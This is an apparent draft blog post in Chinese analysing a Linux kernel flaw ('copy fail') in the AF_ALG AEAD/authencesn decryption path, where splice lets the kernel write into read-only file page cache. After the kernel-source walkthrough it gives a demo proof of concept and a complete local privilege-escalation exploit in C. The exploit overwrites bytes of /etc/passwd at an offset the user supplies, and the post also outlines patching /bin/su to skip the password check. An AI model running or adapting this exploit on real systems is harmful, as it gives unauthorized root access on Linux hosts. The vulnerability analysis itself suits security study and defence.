---
title: "copy fail"
slug: copy-fail
description: "正文为空，标题「copy fail」未提供可摘要的内容，无法概括核心结论。"
date: 2026-11-18
author: mixt
category: IO_FILE
tags: [C++]
featured: false
draft: true
---
## 一.前置

### 入口

```c
int tfmfd = socket(AF_ALG, SOCK_SEQPACKET, 0);  //创建AF_ALG接口
struct sockaddr_alg sa = {
    .salg_family = AF_ALG,
    .salg_type = "aead", // 认证加密类型
    .salg_name = "authencesn(hmac(sha256),cbc(aes))" // 选择 authencesn 算法
};
bind(tfmfd, (struct sockaddr *)&sa, sizeof(sa));
int op_fd = accept(tfmfd, NULL, NULL);
```

### scatterlist

```c
#define sg_is_chain(sg)  ((sg)->page_link & SG_CHAIN)
#define sg_is_last(sg)   ((sg)->page_link & SG_END)
#define sg_chain_ptr(sg) ((struct scatterlist *)((sg)->page_link & ~(SG_CHAIN | SG_END)))
#define sg_page(sg)      ((struct page *)((sg)->page_link & ~(SG_CHAIN | SG_END)))
struct scatterlist {
    unsigned long   page_link; // 指向struct page的指针，并复用低位作为标志位
    unsigned int    offset;    // 数据在页面内的起始偏移
    unsigned int    length;    // 该段数据的长度
    dma_addr_t      dma_address; // 用于DMA的物理地址
#ifdef CONFIG_NEED_SG_DMA_LENGTH
	unsigned int	dma_length;
#endif
};
```

> 也许`scatterlist`可以类比成`pipe_buffer`

正如管道的缓冲区是`pipe_buffer[]`一样，内核的缓冲区可以理解为`scatterlist[]`

`scatterlist[]`实际上会把一些碎片化的内存链接成逻辑上的连续内存

`page_link`的低位会被复用作为标志位，`scatterlist`的标志位有以下两种

* `SG_CHAIN`：表示当前条目是一个链，`page_link`实际指向下一个`scatterlist`
* `SG_END`: 表示这是当前链表的最后一个`scatterlist`

## 二.漏洞分析

### scatterlist构造

```c
static int _aead_recvmsg(struct socket *sock, struct msghdr *msg,
			 size_t ignored, int flags)
{
    struct sock *sk = sock->sk;
	struct alg_sock *ask = alg_sk(sk);
	struct sock *psk = ask->parent;
	struct alg_sock *pask = alg_sk(psk);
	struct af_alg_ctx *ctx = ask->private;
	struct aead_tfm *aeadc = pask->private;
	struct crypto_aead *tfm = aeadc->aead;
	struct crypto_sync_skcipher *null_tfm = aeadc->null_tfm;
	unsigned int i, as = crypto_aead_authsize(tfm);
	struct af_alg_async_req *areq;
	struct af_alg_tsgl *tsgl, *tmp;
	struct scatterlist *rsgl_src, *tsgl_src = NULL;
	int err = 0;
	size_t used = 0;		/* [in]  TX bufs to be en/decrypted */
	size_t outlen = 0;		/* [out] RX bufs produced by kernel */
	size_t usedpages = 0;		/* [in]  RX bufs to be used from user */
	size_t processed = 0;		/* [in]  TX bufs to be consumed */
	
    //...
    processed = used + ctx->aead_assoclen;  //processed = AAD || PT 
	list_for_each_entry_safe(tsgl, tmp, &ctx->tsgl_list, list) {
		for (i = 0; i < tsgl->cur; i++) {
			struct scatterlist *process_sg = tsgl->sg + i;

			if (!(process_sg->length) || !sg_page(process_sg))
				continue;
			tsgl_src = process_sg;  //遍历processed找到第一个有效scatterlist并返回
			break;
		}
		if (tsgl_src)
			break;
	}
	if (processed && !tsgl_src) {
		err = -EFAULT;
		goto free;
	}
	/*
	 * Copy of AAD from source to destination
	 *
	 * The AAD is copied to the destination buffer without change. Even
	 * when user space uses an in-place cipher operation, the kernel
	 * will copy the data as it does not see whether such in-place operation
	 * is initiated.
	 *
	 * To ensure efficiency, the following implementation ensure that the
	 * ciphers are invoked to perform a crypto operation in-place. This
	 * is achieved by memory management specified as follows.
	 */

	/* Use the RX SGL as source (and destination) for crypto op. */
	rsgl_src = areq->first_rsgl.sgl.sg;

	if (ctx->enc) {  //ctx -> enc == 0 为解密分支
		/*
		 * Encryption operation - The in-place cipher operation is
		 * achieved by the following operation:
		 *
		 * TX SGL: AAD || PT
		 *	    |	   |
		 *	    | copy |
		 *	    v	   v
		 * RX SGL: AAD || PT || Tag
		 */
		err = crypto_aead_copy_sgl(null_tfm, tsgl_src,
					   areq->first_rsgl.sgl.sg, processed);
		if (err)
			goto free;
		af_alg_pull_tsgl(sk, processed, NULL, 0);
	} else {
		/*
		 * Decryption operation - To achieve an in-place cipher
		 * operation, the following  SGL structure is used:
		 *
		 * TX SGL: AAD || CT || Tag
		 *	    |	   |	 ^
		 *	    | copy |	 | Create SGL link.
		 *	    v	   v	 |
		 * RX SGL: AAD || CT ----+
		 */

		 /* Copy AAD || CT to RX SGL buffer for in-place operation. */
		err = crypto_aead_copy_sgl(null_tfm, tsgl_src,
					   areq->first_rsgl.sgl.sg, outlen); 
        //outlen = used - as; 即AAD || CT
		if (err)
			goto free;

		/* Create TX SGL for tag and chain it to RX SGL. */
		areq->tsgl_entries = af_alg_count_tsgl(sk, processed,
						       processed - as);
		if (!areq->tsgl_entries)
			areq->tsgl_entries = 1;
		areq->tsgl = sock_kmalloc(sk, array_size(sizeof(*areq->tsgl),
							 areq->tsgl_entries),
					  GFP_KERNEL);
		if (!areq->tsgl) {
			err = -ENOMEM;
			goto free;
		}
		sg_init_table(areq->tsgl, areq->tsgl_entries);

		/* Release TX SGL, except for tag data and reassign tag data. */
		af_alg_pull_tsgl(sk, processed, areq->tsgl, processed - as);

		/* chain the areq TX SGL holding the tag with RX SGL */
		if (usedpages) {    
			/* RX SGL present */
			struct af_alg_sgl *sgl_prev = &areq->last_rsgl->sgl;

			sg_unmark_end(sgl_prev->sg + sgl_prev->npages - 1);
			sg_chain(sgl_prev->sg, sgl_prev->npages + 1,
				 areq->tsgl);
		} else
			/* no RX SGL present (e.g. authentication only) */
			rsgl_src = areq->tsgl;
	}

	/* Initialize the crypto operation */
	aead_request_set_crypt(&areq->cra_u.aead_req, rsgl_src,
			       areq->first_rsgl.sgl.sg, used, ctx->iv);
	aead_request_set_ad(&areq->cra_u.aead_req, ctx->aead_assoclen);
	aead_request_set_tfm(&areq->cra_u.aead_req, tfm);

	if (msg->msg_iocb && !is_sync_kiocb(msg->msg_iocb)) {
		/* AIO operation */
		sock_hold(sk);
		areq->iocb = msg->msg_iocb;

		/* Remember output size that will be generated. */
		areq->outlen = outlen;

		aead_request_set_callback(&areq->cra_u.aead_req,
					  CRYPTO_TFM_REQ_MAY_SLEEP,
					  af_alg_async_cb, areq);
		err = ctx->enc ? crypto_aead_encrypt(&areq->cra_u.aead_req) :
				 crypto_aead_decrypt(&areq->cra_u.aead_req);

		/* AIO operation in progress */
		if (err == -EINPROGRESS)
			return -EIOCBQUEUED;

		sock_put(sk);
	} else {
		/* Synchronous operation */
		aead_request_set_callback(&areq->cra_u.aead_req,
					  CRYPTO_TFM_REQ_MAY_SLEEP |
					  CRYPTO_TFM_REQ_MAY_BACKLOG,
					  crypto_req_done, &ctx->wait);
		err = crypto_wait_req(ctx->enc ?
				crypto_aead_encrypt(&areq->cra_u.aead_req) :
				crypto_aead_decrypt(&areq->cra_u.aead_req),
				&ctx->wait);
	}


free:
	af_alg_free_resources(areq);

	return err ? err : outlen;
}
```

> `TX SGL`是`AF_ALG`存储用户发送方向数据的 `scatterlist`

在调用`read()`后，内核实际上会进入`_aead_recvmsg`用以解密/加密数据

并写入`RX SGL`，其中`RX SGL`由用户决定

> ```c
> used = ctx->used;               //assoclen + cryptlen
> used -= ctx->aead_assoclen;    //cryptlen
> err = af_alg_get_rsgl(sk, msg, flags, areq, outlen, &usedpages); //user_page 
> ```

利用`splice`，我们可以将文件页缓存搬运至管道，并把管道转移到`AF_ALG`的`TX SGL`

由于`ctx -> enc == 0`，函数会进入解密分支

`areq -> tsgl`由`sock_kmalloc(sk, array_size(sizeof(*areq->tsgl), areq->tsgl_entries), GFP_KERNEL)`分配

并通过`sg_init_table(areq->tsgl, areq->tsgl_entries)`初始化

> ```c
> void sg_init_table(struct scatterlist *sgl, unsigned int nents)
> {
> 	memset(sgl, 0, sizeof(*sgl) * nents);
> 	sg_init_marker(sgl, nents);
> }
> static inline void sg_init_marker(struct scatterlist *sgl,
> 				  unsigned int nents)
> {
> 	sg_mark_end(&sgl[nents - 1]);
> }
> static inline void sg_mark_end(struct scatterlist *sg)
> {
> 	/*
> 	 * Set termination bit, clear potential chain bit
> 	 */
> 	sg->page_link |= SG_END;
> 	sg->page_link &= ~SG_CHAIN;
> }
> ```

其中`areq -> tsgl_entries`通过`af_alg_count_tsgl(sk, processed, processed - as)`遍历`	TX - > TAG`得到

> 因此`areq -> tsgl`实际上只承载`TX SGL`的TAG部分

之后利用`af_alg_pull_tsgl(sk, processed, areq->tsgl, processed - as)`在`areq->tsgl`中正式挂载`scatterlist`

> ```c
> void af_alg_pull_tsgl(struct sock *sk, size_t used, struct scatterlist *dst,
> 		      size_t dst_offset)
> {                    
>     //...
>     get_page(page);
> 	sg_set_page(dst + j, page,
> 					plen - dst_offset,
> 					sg[i].offset + dst_offset);
>     //...
> }
> ```

至此，文件页缓存的引用被转移进`areq -> tsgl`

### 漏洞点

```c
		if (usedpages) {    
			/* RX SGL present */
			struct af_alg_sgl *sgl_prev = &areq->last_rsgl->sgl;

			sg_unmark_end(sgl_prev->sg + sgl_prev->npages - 1);
			sg_chain(sgl_prev->sg, sgl_prev->npages + 1,
				 areq->tsgl);
		}
```

`sg_unmark_end(sgl_prev->sg + sgl_prev->npages - 1)`会移除`RX SGL`最后一个`scatterlist`的`SG_END`标志位

> ```c
> static inline void sg_unmark_end(struct scatterlist *sg)
> {
> 	sg->page_link &= ~SG_END;
> }
> ```

通过`sg_chain(sgl_prev->sg, sgl_prev->npages + 1, areq->tsgl)`，`tsgl`被链接到了`RX SGL`末尾

> ```c
> static inline void sg_chain(struct scatterlist *prv, unsigned int prv_nents,
> 			    struct scatterlist *sgl)
> {
> 	__sg_chain(&prv[prv_nents - 1], sgl);
> }
> static inline void __sg_chain(struct scatterlist *chain_sg,
> 			      struct scatterlist *sgl)
> {
> 	chain_sg->offset = 0;
> 	chain_sg->length = 0;
> 
> 	chain_sg->page_link = ((unsigned long) sgl | SG_CHAIN) & ~SG_END; 
> }
> ```

现在`RX`的结构就是`AAD || CT ---chain---> tsgl`了

```c
err = crypto_wait_req(ctx->enc ?
				crypto_aead_encrypt(&areq->cra_u.aead_req) :
				crypto_aead_decrypt(&areq->cra_u.aead_req),
				&ctx->wait);
```

因为是解密分支，我们会进入`crypto_aead_decrypt`

并且由于绑定了`authencesn`算法，最终会调用`crypto_authenc_esn_decrypt`

同样重要的是，由于设计失误，`aead_req -> src == aead_req -> dst`

> 实际上这里的设计失误是因为后续缺少了对`aead_req -> dst`的检查
>
> `src == dst == rsgl_src`是 `algif_aead` 有意的设计
>
> **而 splice 能把文件页src挂进 dst 覆盖的范围**

这使得后续数据写入步骤中，**为dst准备独立可写区域的路径被跳过**

```c
rsgl_src = areq->first_rsgl.sgl.sg
aead_request_set_crypt(&areq->cra_u.aead_req, rsgl_src,
			       areq->first_rsgl.sgl.sg, used, ctx->iv);
```

>```c
>static inline void aead_request_set_crypt(struct aead_request *req,
>					  struct scatterlist *src,
>					  struct scatterlist *dst,
>					  unsigned int cryptlen, u8 *iv)
>{
>	req->src = src;
>	req->dst = dst;
>	req->cryptlen = cryptlen;
>	req->iv = iv;
>}
>```

### 数据写入

```c
struct aead_request {
	struct crypto_async_request base;

	unsigned int assoclen;
	unsigned int cryptlen;

	u8 *iv;

	struct scatterlist *src;
	struct scatterlist *dst;

	void *__ctx[] CRYPTO_MINALIGN_ATTR;
};
```

```c
static int crypto_authenc_esn_decrypt(struct aead_request *req)
{
	struct crypto_aead *authenc_esn = crypto_aead_reqtfm(req);
	struct authenc_esn_request_ctx *areq_ctx = aead_request_ctx(req);
	struct crypto_authenc_esn_ctx *ctx = crypto_aead_ctx(authenc_esn);
	struct ahash_request *ahreq = (void *)(areq_ctx->tail + ctx->reqoff);
	unsigned int authsize = crypto_aead_authsize(authenc_esn);
	struct crypto_ahash *auth = ctx->auth;
	u8 *ohash = PTR_ALIGN((u8 *)areq_ctx->tail,
			      crypto_ahash_alignmask(auth) + 1);
	unsigned int assoclen = req->assoclen;
	unsigned int cryptlen = req->cryptlen;
	u8 *ihash = ohash + crypto_ahash_digestsize(auth);
	struct scatterlist *dst = req->dst;
	u32 tmp[2];
	int err;

	cryptlen -= authsize;

	if (req->src != dst) { //req->src == req -> dst
		err = crypto_authenc_esn_copy(req, assoclen + cryptlen);
		if (err)
			return err;
	}

	scatterwalk_map_and_copy(ihash, req->src, assoclen + cryptlen,
				 authsize, 0);

	if (!authsize)
		goto tail;

	/* Move high-order bits of sequence number to the end. */
	scatterwalk_map_and_copy(tmp, dst, 0, 8, 0);
	scatterwalk_map_and_copy(tmp, dst, 4, 4, 1);
	scatterwalk_map_and_copy(tmp + 1, dst, assoclen + cryptlen, 4, 1);

	sg_init_table(areq_ctx->dst, 2);
	dst = scatterwalk_ffwd(areq_ctx->dst, dst, 4);

	ahash_request_set_tfm(ahreq, auth);
	ahash_request_set_crypt(ahreq, dst, ohash, assoclen + cryptlen);
	ahash_request_set_callback(ahreq, aead_request_flags(req),
				   authenc_esn_verify_ahash_done, req);

	err = crypto_ahash_digest(ahreq);
	if (err)
		return err;

tail:
	return crypto_authenc_esn_decrypt_tail(req, aead_request_flags(req));
}
```

`copy fail`漏洞逻辑就是向只读文件页缓存写入数据

但是具体是怎么做到的呢？难道PTE是棍木吗？

我们的目标是`scatterwalk_map_and_copy`

```c
void scatterwalk_map_and_copy(void *buf, struct scatterlist *sg,
			      unsigned int start, unsigned int nbytes, int out)
{
	struct scatter_walk walk;
	struct scatterlist tmp[2];

	if (!nbytes)
		return;

	sg = scatterwalk_ffwd(tmp, sg, start); 

	scatterwalk_start(&walk, sg);
	scatterwalk_copychunks(buf, &walk, nbytes, out);
	scatterwalk_done(&walk, out, 0);
}
```

临时数组`scatterlist[2]`被声明并用于创建`scatter_walk`，进入`scatterwalk_ffwd`

通过循环比对`src -> length > assoclen + cryptlen`，我们最终可定位到位于`RX SGL`尾部的`tsgl`

在循环中，`src -> length = assoclen + cryptlen`，因此`len -= src -> length`得到`len = 0`

`sg_next(src)`直接跳到`tsgl`，回到循环头`if (!len) return src`直接返回`tsgl`指针

> RX SGL结构为 AAD || CT ---chain---> tsgl
>
> 其中AAD长度为assoclen，CT长度为cryptlen
>
> 因此偏移`assoclen + cryptlen`正好能定位到`tsgl`

而`tmp[1] -> page_link`只是链接到下一个scatterlist的指针

> ```c
> struct scatterlist *scatterwalk_ffwd(struct scatterlist dst[2],
> 				     struct scatterlist *src,
> 				     unsigned int len)
> {
> 	for (;;) {
> 		if (!len)
> 			return src;
> 
> 		if (src->length > len)   
> 			break;
> 
> 		len -= src->length; 
> 		src = sg_next(src);
> 	}
> 
> 	sg_init_table(dst, 2);  //初始化scatterlist[2],上文有所提及
> 	sg_set_page(dst, sg_page(src), src->length - len, src->offset + len);
> 	scatterwalk_crypto_chain(dst, sg_next(src), 2);
> 
> 	return dst;
> }
> static inline void sg_set_page(struct scatterlist *sg, struct page *page,
> 			       unsigned int len, unsigned int offset)
> {
> 	sg_assign_page(sg, page);  //复用page_link末位为标志位SG_CHIAN/SG_END
> 	sg->offset = offset;
> 	sg->length = len;
> }
> static inline void scatterwalk_crypto_chain(struct scatterlist *head, //tmp, sg_next(src), 2
> 					    struct scatterlist *sg, int num)
> {
> 	if (sg)
> 		sg_chain(head, num, sg);
> 	else
> 		sg_mark_end(head);
> }
> struct scatterlist *sg_next(struct scatterlist *sg)
> {
> 	if (sg_is_last(sg))
> 		return NULL;
> 
> 	sg++;
> 	if (unlikely(sg_is_chain(sg)))
> 		sg = sg_chain_ptr(sg);
> 
> 	return sg;
> }
> 
> ```

利用`scatterwalk_start(&walk, sg)`配置好scatter_walk

>```c
>struct scatter_walk {
>	struct scatterlist *sg;  //walk -> sg  = tmp[0]
>	unsigned int offset;    //walk -> offset = sg -> offset
>};
>```

万事俱备，我们可以开始拷贝数据了

```c
void scatterwalk_copychunks(void *buf, struct scatter_walk *walk,  
			    size_t nbytes, int out)
{
	for (;;) {
		unsigned int len_this_page = scatterwalk_pagelen(walk);  //长度检测
		u8 *vaddr;

		if (len_this_page > nbytes)  
			len_this_page = nbytes;

		if (out != 2) {
			vaddr = scatterwalk_map(walk); //vaddr就是walk -> sg -> page_link的虚拟地址了
			memcpy_dir(buf, vaddr, len_this_page, out); 
			scatterwalk_unmap(vaddr);
		}

		scatterwalk_advance(walk, len_this_page);

		if (nbytes == len_this_page)
			break;

		buf += len_this_page;
		nbytes -= len_this_page;

		scatterwalk_pagedone(walk, out & 1, 1);
	}
}
static inline void memcpy_dir(void *buf, void *sgdata, size_t nbytes, int out)
{
	void *src = out ? buf : sgdata; //out = 1就是输入，src = buf
	void *dst = out ? sgdata : buf; 

	memcpy(dst, src, nbytes); 
}
```

### 漏洞点

```c
static inline void *scatterwalk_map(struct scatter_walk *walk)
{
	return kmap_atomic(scatterwalk_page(walk)) +
	       offset_in_page(walk->offset);
}
#define offset_in_page(ptr) 	 ((unsigned long)(ptr) & ~PAGE_MASK)
//PAGE_MASK = ~(PAGE_SIZE - 1)
```

`scatterwalk_page` 把 `walk->sg` 换算成目标所在的 `struct page`，并用`offset_in_page` 补上页内偏移

```c
static inline struct page *scatterwalk_page(struct scatter_walk *walk)
{
	return sg_page(walk->sg) + (walk->offset >> PAGE_SHIFT);
}
#define PAGE_SHIFT 12
//实际上就是除以page_size
static inline struct page *sg_page(struct scatterlist *sg)
{
#ifdef CONFIG_DEBUG_SG
	BUG_ON(sg_is_chain(sg));
#endif
	return (struct page *)((sg)->page_link & ~(SG_CHAIN | SG_END));  //清除标志位
}
```

```c
static inline void *kmap_atomic(struct page *page)
{
	preempt_disable();
	pagefault_disable();
	return page_address(page);
}
```

通过`page_address(page)`可直接获取页的`direct map`地址

即`vaddr = page_offset_base + (page_to_pfn(page) << PAGE_SHIFT)`

而文件页缓存等所有普通页的`direct map`项均是可读写的

因此我们可利用`memcpy`向只读文件页缓存写入数据

> 由于我们全程甚至没有用`mmap`为文件开映射
>
> 所以文件的`PTE`根本没有生成
>
> 比棍木还棍木🤣

```c
    scatterwalk_map_and_copy(tmp, dst, 0, 8, 0);  //从AAD取8字节
	scatterwalk_map_and_copy(tmp, dst, 4, 4, 1);
	scatterwalk_map_and_copy(tmp + 1, dst, assoclen + cryptlen, 4, 1); //写tag起点 -> 文件页
```

### 示例

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <linux/if_alg.h>
#include <stdint.h>
#include <arpa/inet.h>

#define ASSOCLEN 8
int main(){
    int tmpfd = socket(AF_ALG, SOCK_SEQPACKET ,0); 
    struct sockaddr_alg sa;
    memset(&sa, 0, sizeof(sa));
    sa.salg_family = AF_ALG;
    memcpy(sa.salg_type, "aead", 5);
    memcpy(sa.salg_name, "authencesn(hmac(sha256),cbc(aes))", 33);
    bind(tmpfd, (struct sockaddr *)&sa, sizeof(sa));
    uint8_t key[8 + 32 + 16];
    memset(key, 0, sizeof(key));
    *(uint16_t *)(key + 0) = 8;              /* rta_len */
    *(uint16_t *)(key + 2) = 1;              /* CRYPTO_AUTHENC_KEYA_PARAM */
    *(uint32_t *)(key + 4) = htonl(16);      /* enckeylen, big endian */
    memset(key + 8,  0x42, 32);              /* authkey: hmac(sha256) */
    memset(key + 40, 0x43, 16);              /* enckey : cbc(aes)     */
    setsockopt(tmpfd, SOL_ALG, ALG_SET_KEY, key, sizeof(key));
    setsockopt(tmpfd, SOL_ALG, ALG_SET_AEAD_AUTHSIZE, NULL, 4);
    int op_fd = accept(tmpfd, NULL, NULL);
    char edit[8];
    memset(edit,'A',sizeof(edit));
    enum { CBUF = CMSG_SPACE(sizeof(uint32_t)) * 2 +
              CMSG_SPACE(sizeof(struct af_alg_iv) + 16) };
    char cbuf[CBUF];
    memset(cbuf, 0, sizeof(cbuf));
    struct iovec iov = { .iov_base = edit, .iov_len = ASSOCLEN };  
    struct msghdr msg;
    memset(&msg, 0, sizeof(msg));
    msg.msg_iov        = &iov;        
    msg.msg_iovlen     = 1;           
    msg.msg_control    = cbuf;        
    msg.msg_controllen = CBUF;        
    struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);   
    cmsg->cmsg_level = SOL_ALG;                   
    cmsg->cmsg_type  = ALG_SET_OP;               
    cmsg->cmsg_len   = CMSG_LEN(sizeof(uint32_t));
    *(uint32_t *)CMSG_DATA(cmsg) = ALG_OP_DECRYPT; 
    cmsg = CMSG_NXTHDR(&msg, cmsg);  
    cmsg->cmsg_level = SOL_ALG;
    cmsg->cmsg_type  = ALG_SET_AEAD_ASSOCLEN;   
    cmsg->cmsg_len   = CMSG_LEN(sizeof(uint32_t));
    *(uint32_t *)CMSG_DATA(cmsg) = ASSOCLEN;
    cmsg = CMSG_NXTHDR(&msg, cmsg);   
    cmsg->cmsg_level = SOL_ALG;
    cmsg->cmsg_type  = ALG_SET_IV;                
    cmsg->cmsg_len   = CMSG_LEN(sizeof(struct af_alg_iv) + 16);  
    struct af_alg_iv *iv = (struct af_alg_iv *)CMSG_DATA(cmsg);  
    iv->ivlen = 16;                                  
    memset(iv->iv, 0, 16);                     
    sendmsg(op_fd, &msg, MSG_MORE);
    int pipe_fd[2];
    pipe(pipe_fd);
    int fd = open("/flag",O_RDONLY);
    size_t off = 0;
    splice(fd, &off, pipe_fd[1], NULL, 4, 0);
    splice(pipe_fd[0], NULL, op_fd, NULL, 4 , 0);
    char buf[0x40];
    read(op_fd, buf, sizeof(buf));
    close(fd);
    close(pipe_fd[0]);
    close(pipe_fd[1]);
    close(op_fd);
    close(tmpfd);
    return 0;
}
```

![OOB2](D:\blog\OOB2.png)

## 三.漏洞利用

在`/bin/su`中，有关密码检验的逻辑大概是

```asm
call   getuid
test   eax, eax
jne    require_password      ; 0x75 xx —— 非 root 跳去要密码
```

若利用漏洞修改`jne`为`je`，非 root 反而跳过密码校验

于是直接`su root`即可夺权

或是直接在`/etc/passwd`写入一个伪造的uid = 0用户

## 四.Explot

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <linux/if_alg.h>
#include <stdint.h>
#include <arpa/inet.h>

#define ASSOCLEN 8
int main(int argc, char **argv){
    int tmpfd = socket(AF_ALG, SOCK_SEQPACKET ,0); 
    struct sockaddr_alg sa;
    memset(&sa, 0, sizeof(sa));
    sa.salg_family = AF_ALG;
    memcpy(sa.salg_type, "aead", 5);
    memcpy(sa.salg_name, "authencesn(hmac(sha256),cbc(aes))", 33);
    bind(tmpfd, (struct sockaddr *)&sa, sizeof(sa));
    uint8_t key[8 + 32 + 16];
    memset(key, 0, sizeof(key));
    *(uint16_t *)(key + 0) = 8;              /* rta_len */
    *(uint16_t *)(key + 2) = 1;              /* CRYPTO_AUTHENC_KEYA_PARAM */
    *(uint32_t *)(key + 4) = htonl(16);      /* enckeylen, big endian */
    memset(key + 8,  0x42, 32);              /* authkey: hmac(sha256) */
    memset(key + 40, 0x43, 16);              /* enckey : cbc(aes)     */
    setsockopt(tmpfd, SOL_ALG, ALG_SET_KEY, key, sizeof(key));
    setsockopt(tmpfd, SOL_ALG, ALG_SET_AEAD_AUTHSIZE, NULL, 4);
    int op_fd = accept(tmpfd, NULL, NULL);
    char edit[8];
    if(!argv[2]){
        memset(edit, '\n', sizeof(edit));
    }else{
        memcpy(edit + 4, argv[2], 4);
    }
    enum { CBUF = CMSG_SPACE(sizeof(uint32_t)) * 2 +
              CMSG_SPACE(sizeof(struct af_alg_iv) + 16) };
    char cbuf[CBUF];
    memset(cbuf, 0, sizeof(cbuf));
    struct iovec iov = { .iov_base = edit, .iov_len = ASSOCLEN };  
    struct msghdr msg;
    memset(&msg, 0, sizeof(msg));
    msg.msg_iov        = &iov;        
    msg.msg_iovlen     = 1;           
    msg.msg_control    = cbuf;        
    msg.msg_controllen = CBUF;        
    struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);   
    cmsg->cmsg_level = SOL_ALG;                   
    cmsg->cmsg_type  = ALG_SET_OP;               
    cmsg->cmsg_len   = CMSG_LEN(sizeof(uint32_t));
    *(uint32_t *)CMSG_DATA(cmsg) = ALG_OP_DECRYPT; 
    cmsg = CMSG_NXTHDR(&msg, cmsg);  
    cmsg->cmsg_level = SOL_ALG;
    cmsg->cmsg_type  = ALG_SET_AEAD_ASSOCLEN;   
    cmsg->cmsg_len   = CMSG_LEN(sizeof(uint32_t));
    *(uint32_t *)CMSG_DATA(cmsg) = ASSOCLEN;
    cmsg = CMSG_NXTHDR(&msg, cmsg);   
    cmsg->cmsg_level = SOL_ALG;
    cmsg->cmsg_type  = ALG_SET_IV;                
    cmsg->cmsg_len   = CMSG_LEN(sizeof(struct af_alg_iv) + 16);  
    struct af_alg_iv *iv = (struct af_alg_iv *)CMSG_DATA(cmsg);  
    iv->ivlen = 16;                                  
    memset(iv->iv, 0, 16);                     
    sendmsg(op_fd, &msg, MSG_MORE);
    int pipe_fd[2];
    pipe(pipe_fd);
    int fd = open("/etc/passwd",O_RDONLY);
    size_t off = strtoul(argv[1], NULL, 0);
    splice(fd, &off, pipe_fd[1], NULL, 4 , 0);
    splice(pipe_fd[0], NULL, op_fd, NULL, 4 , 0);
    char buf[0x40];
    read(op_fd, buf, sizeof(buf));
    close(fd);
    close(pipe_fd[0]);
    close(pipe_fd[1]);
    close(op_fd);
    close(tmpfd);
    return 0;
}
```

![root](D:\blog\root.png)

